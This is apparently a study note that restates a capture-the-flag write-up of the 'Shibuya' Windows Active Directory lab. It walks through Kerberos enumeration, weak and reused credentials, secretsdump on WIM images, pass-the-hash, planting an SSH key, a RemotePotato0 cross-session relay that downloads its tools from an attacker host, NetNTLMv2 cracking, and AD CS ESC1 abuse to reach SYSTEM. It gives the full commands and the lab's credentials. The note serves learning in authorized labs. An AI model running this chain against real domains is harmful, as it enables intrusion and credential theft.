+++
date = '2026-11-11T14:18:28+06:30'
title = 'Shibuya ECS1'
cover = '/images/covers/9.jpg'
+++

# WinPen — Shibuya (Windows Active Directory)

> **Source:** Shibuya write-up by amra  
> **Machine:** Shibuya  
> **Difficulty:** Medium  
> **OS / Role:** Windows Server 2022, Active Directory Domain Controller  
> **Domain:** `shibuya.vl`  
> **Hostname:** `AWSJPDC0522.shibuya.vl`

## 1. What this machine teaches

The attack path in this write-up is:

1. Enumerate the Domain Controller and identify valid domain usernames with Kerberos.
2. Find weak credentials for the `red` account.
3. Enumerate SMB shares and Active Directory user descriptions.
4. Recover the `svc_autojoin` password from its description.
5. Access Windows Imaging Format (WIM) files and extract local/domain credential material.
6. Reuse the recovered operator NTLM hash as `simon.watson`.
7. Add an SSH public key to Simon's profile to obtain command execution.
8. Identify Nigel's active RDP session and perform a cross-session relay attack.
9. Crack Nigel's captured NetNTLMv2 response.
10. Enumerate AD Certificate Services (AD CS), identify the vulnerable `ShibuyaWeb` template, and abuse ESC1 to obtain an Administrator certificate.
11. Authenticate with the certificate, retrieve the Administrator NT hash, and reach `NT AUTHORITY\\SYSTEM`.

### Skills covered

- Active Directory enumeration
- SMB and Kerberos enumeration
- Windows user and share enumeration
- Offline analysis of WIM images
- NTLM hash reuse
- SSH key-based access to Windows
- Windows session enumeration
- Cross-session relay
- AD CS enumeration and ESC1

---

## 2. Initial enumeration

### 2.1 Scan all TCP ports, then enumerate discovered services

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.234.42 \
  | grep ^[0-9] \
  | cut -d '/' -f 1 \
  | tr '\n' ',' \
  | sed 's/,$//')

nmap -p"$ports" -sC -sV 10.129.234.42
```

Important services from the scan:

| Port | Service | Why it matters |
|---:|---|---|
| 22 | OpenSSH for Windows 9.5 | Unusual on a Windows Domain Controller; keep it in mind for later access |
| 53 | DNS | Domain name resolution |
| 88 | Kerberos | Authentication and username enumeration |
| 135, 139 | MSRPC / NetBIOS | Windows networking and RPC |
| 445 | SMB | Shares and Windows file access |
| 464 | Kerberos password change | Kerberos-related service |
| 3268, 3269 | LDAP / LDAPS Global Catalog | Active Directory directory queries |
| 3389 | RDP | Remote interactive sessions |
| 9389 | .NET Message Framing | Commonly associated with Active Directory Web Services |

The scan identifies:

- Host: `AWSJPDC0522`
- Domain: `shibuya.vl`
- OS: Windows Server 2022, build 20348

Add the hostname and domain to `/etc/hosts`:

```bash
echo "10.129.234.42 AWSJPDC0522.shibuya.vl shibuya.vl" | sudo tee -a /etc/hosts
```

**Learning point:** A combination of Kerberos, LDAP, SMB, DNS, and Global Catalog ports strongly suggests an Active Directory environment. The open SSH service is also worth recording because it may provide a way to execute commands later.

---

## 3. SMB and Kerberos enumeration

### 3.1 Check anonymous and Guest share access

```bash
nxc smb shibuya.vl -u '' -p '' --shares
nxc smb shibuya.vl -u guest -p '' --shares
```

The write-up reports that anonymous access is denied and the Guest account is disabled.

### 3.2 Enumerate domain usernames with Kerbrute

```bash
kerbrute userenum \
  -d shibuya.vl \
  --dc AWSJPDC0522.shibuya.vl \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Valid usernames discovered:

- `purple`
- `red`

The write-up then tests whether the username is also the password and finds that `red:red` works.

Before Kerberos authentication, synchronize the local clock with the Domain Controller:

```bash
sudo ntpdate -u shibuya.vl
```

Test the credentials:

```bash
nxc smb shibuya.vl -u red -p red -k
```

**Learning point — Kerberos time synchronization:** Kerberos authentication is time-sensitive. A sufficiently large clock difference between the client and the Domain Controller can cause authentication failures.

### 3.3 Enumerate SMB shares

```bash
nxc smb shibuya.vl -u red -p red -k --shares
```

The useful shares include:

| Share | Access / purpose |
|---|---|
| `SYSVOL` | Readable domain policy and logon-related files |
| `NETLOGON` | Readable logon server share |
| `users` | Read access |
| `images$` | A non-standard share discovered during enumeration |
| `ADMIN$`, `C$` | Administrative shares; access is not automatically granted |

Connect with Impacket's SMB client:

```bash
impacket-smbclient -k shibuya.vl/red:red@AWSJPDC0522.shibuya.vl
```

Inside the SMB client:

```text
use users
ls
```

The `users` share exposes directory names such as `nigel.mills` and `simon.watson`, but attempting to enter individual user directories returns `STATUS_ACCESS_DENIED`.

**Learning point:** Being able to list a share does not mean you have permission to read every directory inside it. Share permissions and NTFS permissions both affect access.

---

## 4. Find credentials in Active Directory user descriptions

Enumerate domain users:

```bash
nxc smb shibuya.vl -u red -p red -k --users
```

The write-up finds a password-like string in the `Description` field of `svc_autojoin`:

```text
svc_autojoin
K5&A6Dw9d8jrKWhV
```

Validate the credentials:

```bash
nxc smb shibuya.vl \
  -u svc_autojoin \
  -p 'K5&A6Dw9d8jrKWhV' \
  -k
```

Then enumerate shares again:

```bash
nxc smb shibuya.vl \
  -u svc_autojoin \
  -p 'K5&A6Dw9d8jrKWhV' \
  -k --shares
```

This account can read `images$`.

**Learning point:** Active Directory user objects contain attributes such as `Description`. Administrators sometimes accidentally place passwords or other sensitive information in these fields. During an authorized assessment, inspect exposed user attributes instead of checking only usernames.

---

## 5. Investigate the WIM files

Connect to the `images$` share:

```bash
impacket-smbclient -k \
  shibuya.vl/svc_autojoin:'K5&A6Dw9d8jrKWhV'@AWSJPDC0522.shibuya.vl
```

Inside the SMB client:

```text
use images$
ls
mget *
```

The share contains:

- `AWSJPWK0222-01.wim`
- `AWSJPWK0222-02.wim`
- `AWSJPWK0222-03.wim`
- `vss-meta.cab`

WIM means **Windows Imaging Format**. It is a file-based disk image format used by Windows deployment and imaging tools. The write-up investigates the images offline for credential material.

Mount the second image:

```bash
sudo wimmount AWSJPWK0222-02.wim /mnt
```

Extract local SAM and SECURITY information using the SYSTEM hive:

```bash
impacket-secretsdump \
  -system /mnt/SYSTEM \
  -sam /mnt/SAM \
  -security /mnt/SECURITY \
  local
```

The output includes a local account named `operator` and its NTLM hash:

```text
operator:1000:aad3b435b51404eeaad3b435b51404ee:5d8c3d1a20bd63f60f469f6763ca0d50:::
```

It also contains cached domain logon information for `Simon.Watson`.

The write-up tests the `operator` NTLM hash against the domain account `simon.watson` and confirms that the hash is accepted:

```bash
nxc smb shibuya.vl \
  -u simon.watson \
  -H 5d8c3d1a20bd63f60f469f6763ca0d50
```

**Learning point — credential reuse:** The local `operator` account's hash works for the domain user `simon.watson`. This is an example of password/hash reuse across accounts. An NTLM hash can be used for pass-the-hash authentication where the target service and configuration permit it.

---

## 6. Get command execution as Simon through SSH

The `users` share is now accessible with Simon's credentials. The write-up finds `user.txt` in Simon's Desktop:

```text
users/simon.watson/Desktop/user.txt
```

The machine has SSH open, so the write-up uses public-key authentication.

Generate an Ed25519 key pair locally:

```bash
ssh-keygen -t ed25519 -f amra
```

Prepare the public key with the expected filename:

```bash
mv amra.pub authorized_keys
```

Connect to the SMB share using Simon's NTLM hash:

```bash
impacket-smbclient \
  simon.watson@shibuya.vl \
  -hashes :5d8c3d1a20bd63f60f469f6763ca0d50
```

Inside the SMB client, create the `.ssh` directory in Simon's profile and upload the public key:

```text
use users
cd simon.watson
mkdir .ssh
cd .ssh
put authorized_keys
```

Then connect over SSH using the private key:

```bash
ssh -i amra -D 1080 simon.watson@shibuya.vl
```

The `-D 1080` option creates a local SOCKS proxy on port 1080. This can be useful when tools need to reach services through the SSH connection.

Verify the account:

```cmd
whoami
```

Expected identity:

```text
shibuya\simon.watson
```

**Learning point:** SSH public-key authentication uses a key pair. The public key is placed in the account's `authorized_keys` file, while the private key stays on the client.

---

## 7. Enumerate Windows sessions

The write-up uses RunasCs to run `qwinsta` and inspect terminal sessions.

Transfer `RunasCs.exe` to the Windows machine. The write-up uses a local Python HTTP server:

```bash
sudo python3 -m http.server 80
```

From the Windows SSH session, download the executable. The source write-up shows:

```powershell
wget 10.10.14.67/RunasCs.exe -o run.exe -usebasicparsing
```

Then run:

```powershell
.\run.exe -l 9 amra amra qwinsta
```

The important output is:

```text
SESSIONNAME       USERNAME       ID  STATE
rdp-tcp#0         nigel.mills     1   Active
```

This tells us that `nigel.mills` has an active RDP session.

**What is `qwinsta`?**

`qwinsta` (Query WINdows STAtion) displays information about Remote Desktop Services sessions. Useful fields include:

- `SESSIONNAME`: the session name
- `USERNAME`: the logged-in account
- `ID`: the session ID
- `STATE`: whether the session is active, disconnected, or listening

**What is RunasCs?**

RunasCs is a tool for running a process under another Windows user context when valid credentials are available. In this write-up it is used to launch `qwinsta` and inspect session information.

---

## 8. Cross-session relay and Nigel's credentials

The write-up uses RemotePotato0 to perform a cross-session relay attack against the active session.

The documented sequence is:

1. Transfer `RemotePotato0.exe` to the Windows host.
2. Start a `socat` TCP redirection on the attacking machine.
3. Run RemotePotato0 from the Windows session.
4. Capture the authentication material associated with Nigel's session.
5. Save the captured NetNTLMv2 response and attempt to crack it.

The write-up's relay setup:

```bash
socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.234.42:8888
```

The RemotePotato0 invocation shown in the write-up:

```powershell
.\potato.exe -m 2 -r 10.10.14.67 -x 10.10.14.67 -p 8888 -s 1
```

The output confirms that the relayed authentication belongs to:

```text
SHIBUYA\Nigel.Mills
```

The captured response is a **NetNTLMv2 challenge-response**, not a plaintext password and not an NTLM password hash in the same format as the local SAM hash.

The write-up saves the captured response in a file named `hash` and uses John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

The password recovered in the write-up is:

```text
Sail2Boat3
```

Connect as Nigel over SSH:

```bash
ssh -D 1080 nigel.mills@shibuya.vl
```

Check group membership:

```cmd
whoami /groups
```

The important group is:

```text
SHIBUYA\t1_admins
```

**Learning point:** An active interactive session can expose authentication opportunities that are not available from a normal non-interactive account context. The write-up uses a cross-session relay to capture Nigel's authentication and then cracks the response offline.

---

## 9. Enumerate AD CS and identify ESC1

AD CS (Active Directory Certificate Services) is Microsoft's Public Key Infrastructure (PKI) implementation. In an AD environment, certificate templates define who can request certificates and what those certificates can be used for.

The write-up uses Certipy to enumerate certificate authorities and vulnerable templates:

```bash
proxychains -q certipy-ad find \
  -u nigel.mills \
  -p 'Sail2Boat3' \
  -dc-ip 10.129.234.42 \
  -dns-tcp \
  -vulnerable \
  -enabled \
  -stdout
```

The output identifies the CA:

```text
shibuya-AWSJPDC0522-CA
```

And the template:

```text
ShibuyaWeb
```

Relevant template properties reported by the write-up:

| Property | Value |
|---|---|
| Template | `ShibuyaWeb` |
| Enabled | True |
| Client Authentication | True |
| Enrollee Supplies Subject | True |
| Requires Manager Approval | False |
| Authorized Signatures Required | 0 |
| Enrollment rights | `SHIBUYA.VL\t1_admins`, Domain Admins, Enterprise Admins |

The output reports ESC1 because members of `t1_admins` can enroll in a template that allows the enrollee to supply the subject and supports client authentication.

### What is ESC1?

ESC1 is an AD CS misconfiguration involving a certificate template that allows an enrolling user to specify the identity in the certificate request, while the template permits authentication.

If an account can enroll in such a template, it may be possible to request a certificate representing a more privileged account. The certificate can then be used for authentication as that account, depending on the environment's configuration.

**Why Nigel matters:** Nigel belongs to `t1_admins`, and that group has enrollment rights on `ShibuyaWeb`.

---

## 10. Request an Administrator certificate

The write-up obtains the domain SID from the machine's security information and uses the well-known RID `500` for the built-in Administrator account.

The resulting SID is:

```text
S-1-5-21-87560095-894484815-3652015022-500
```

Request a certificate using the `ShibuyaWeb` template and specify `_admin` as the UPN:

```bash
proxychains -q certipy-ad req \
  -u nigel.mills \
  -p 'Sail2Boat3' \
  -target-ip 10.129.234.42 \
  -ca shibuya-AWSJPDC0522-CA \
  -template ShibuyaWeb \
  -upn _admin \
  -key-size 4096 \
  -debug \
  -sid S-1-5-21-87560095-894484815-3652015022-500
```

The write-up reports that the certificate request succeeds and saves:

```text
_admin.pfx
```

A PFX file contains the certificate and its associated private key.

---

## 11. Authenticate with the certificate and obtain SYSTEM

Use the PFX file to authenticate:

```bash
proxychains -q certipy-ad auth \
  -pfx _admin.pfx \
  -domain shibuya.vl \
  -dc-ip 10.129.234.42
```

The write-up reports that Certipy obtains a TGT and retrieves the NT hash for `_admin`:

```text
bab5b2a004eabb11d865f31912b6b430
```

Use the hash with Impacket:

```bash
impacket-smbexec \
  _admin@shibuya.vl \
  -hashes :bab5b2a004eabb11d865f31912b6b430
```

Verify the resulting identity:

```cmd
whoami
```

Expected result:

```text
nt authority\system
```

The root flag is located at:

```text
C:\Users\Administrator\Desktop\root.txt
```

---

## 12. Important concepts to review

| Concept | What to understand |
|---|---|
| Domain Controller | A server that provides Active Directory authentication and directory services |
| Kerberos | A ticket-based authentication protocol used by Active Directory |
| SMB | Windows file and printer sharing protocol; commonly exposed on TCP 445 |
| Share permissions | Permissions controlling access to an SMB share |
| NTFS permissions | File-system permissions controlling access to files and directories |
| User description | An AD user attribute that may accidentally expose sensitive information |
| WIM | Windows Imaging Format; can contain Windows system files and registry hives |
| SAM | Local Windows account database |
| NTLM hash | Password-derived hash used by Windows authentication mechanisms |
| Pass the hash | Authenticating with an NTLM hash rather than the plaintext password |
| SSH `authorized_keys` | File containing public keys allowed to authenticate to an account |
| SOCKS proxy | A proxy endpoint that forwards application traffic through another connection |
| `qwinsta` | Displays Remote Desktop Services session information |
| NetNTLMv2 | Challenge-response authentication material that may be captured and tested offline |
| AD CS | Active Directory Certificate Services |
| Certificate template | Defines certificate properties and enrollment permissions |
| ESC1 | AD CS template misconfiguration that can allow a requester to specify another identity |
| SID / RID | A Windows security identifier and its relative identifier component |
| PFX | Certificate container that can include a certificate and private key |
| SYSTEM | Highly privileged local Windows security context |

---

## 13. Enumeration checklist for future Windows AD labs

Use this as a learning checklist rather than assuming every lab will follow the same path.

- [ ] Scan all TCP ports and identify the Domain Controller.
- [ ] Record the hostname, domain, and discovered services.
- [ ] Add the hostname and domain to the local hosts file when appropriate.
- [ ] Check anonymous and Guest SMB access.
- [ ] Enumerate valid usernames through permitted Kerberos techniques.
- [ ] Check discovered credentials and authenticate to SMB.
- [ ] Enumerate shares and their permissions.
- [ ] Enumerate domain users and inspect exposed attributes.
- [ ] Investigate accessible files, backups, and image files.
- [ ] Identify credential material and validate any suspected credential reuse.
- [ ] Look for available remote command execution paths such as SSH.
- [ ] Enumerate logged-on users and active sessions.
- [ ] Check group membership and privileges.
- [ ] Enumerate AD CS certificate authorities and templates.
- [ ] Review enrollment rights and template security settings.
- [ ] Understand the relevant AD CS escalation condition before attempting it.

---

## 14. Notes and caveats from the source

- The original write-up contains omitted portions marked as `<SNIP>` and does not show every intermediate command. This note does not invent those missing steps.
- The source uses `10.129.234.42` as the target IP and `10.10.14.67` as the attacking-machine IP in its examples. Replace these with the addresses assigned in your own lab.
- The source synopsis has a `.wmi` typo; the files and later explanation identify the format as `.wim` (Windows Imaging Format).
- The source shows a Certipy enumeration result containing an ESC8 warning for the CA and ESC1/ESC2/ESC3 findings for the template. The exploitation path described in the write-up proceeds with ESC1.
- Tool output and command-line options can vary by version. Treat the commands as the commands shown in the source write-up, not as a guarantee that every installed version behaves identically.
- These techniques are for authorized labs and systems where you have permission to test.

## 15. My learning notes

Add your own observations while reproducing the lab:

### Questions I still need to understand

- Why does Kerberos require time synchronization?
- What is the difference between an NTLM hash and a NetNTLMv2 response?
- How do share permissions differ from NTFS permissions?
- What information is stored in the SAM, SYSTEM, and SECURITY hives?
- How does SSH public-key authentication work on Windows?
- What makes a Windows session suitable for a cross-session relay?
- What exact template settings make ESC1 possible?
- Why does the SID end in `-500` for the built-in Administrator account?
- What is the difference between obtaining a certificate, obtaining a TGT, and obtaining an NT hash?

### Lab notes

_Write your own commands, errors, screenshots, and explanations here._